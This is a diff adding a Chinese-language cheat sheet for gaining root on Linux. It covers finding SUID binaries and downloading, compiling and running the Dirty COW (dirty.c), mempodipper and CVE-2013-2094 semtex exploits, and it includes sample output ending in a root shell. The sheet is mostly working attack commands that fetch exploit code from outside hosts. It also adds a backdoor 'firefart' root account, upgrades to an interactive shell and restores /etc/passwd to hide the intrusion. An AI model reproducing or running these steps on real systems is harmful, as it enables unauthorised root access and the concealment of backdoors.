@@ -1,0 +1,58 @@
+# 利用易受攻击的SUID可执行文件获取root访问权限
+```
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000 -print 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+# dirtycow
+```
+curl -O https://access.redhat.com/sites/default/files/rh-cve-2016-5195_3.sh && chmod +x rh-cve-2016-5195_3.sh
+
+./rh-cve-2016-5195_3.sh && rm -f rh-cve-2016-5195_3.sh	//脏牛漏洞检测
+或
+curl -O https://raw.githubusercontent.com/aishee/scan-dirtycow/master/dirtycowscan.sh  && chmod +x dirtycowscan.sh
+
+./dirtycowscan.sh && rm -f dirtycowscan.sh	//脏牛漏洞检测，适用redhat、ubuntu等
+
+curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c //下载
+
+gcc -pthread dirty.c -o dirty -lcrypt	//编译
+
+./dirty or ./dirty my-new-password	//运行，默认账号firefart
+
+python -c 'import pty; pty.spawn("/bin/bash")' 	//获得标准交互式shell
+
+su firefart	//交互式登陆
+
+mv /tmp/passwd.bak /etc/passwd	//提权添加后门后还原/etc/passwd
+```
+# 通过SUID进行Linux本地root提权
+```
+wget www.tux-planet.fr/public/hack/exploits/kernel/mempodipper.c
+gcc mempodipper.c -o mempodipper
+./mempodipper
+===============================
+= Mempodipper =
+= by zx2c4 =
+= Jan 21, 2012 =
+===============================
+
+[+] Waiting for transferred fd in parent.
+[+] Executing child from child fork.
+[+] Opening parent mem /proc/6454/mem in child.
+[+] Sending fd 3 to parent.
+[+] Received fd at 5.
+[+] Assigning fd 5 to stderr.
+[+] Reading su for exit@plt.
+[+] Resolved exit@plt to 0x402178.
+[+] Seeking to offset 0x40216c.
+[+] Executing su with shellcode.
+sh-4.2# whoami
+root
+```
+# Linux内核2.6.32到3.8.10的本地root漏洞
+```
+wget https://raw.githubusercontent.com/realtalk/cve-2013-2094/master/semtex.c
+gcc -O2 semtex.c
+./a.out
+```
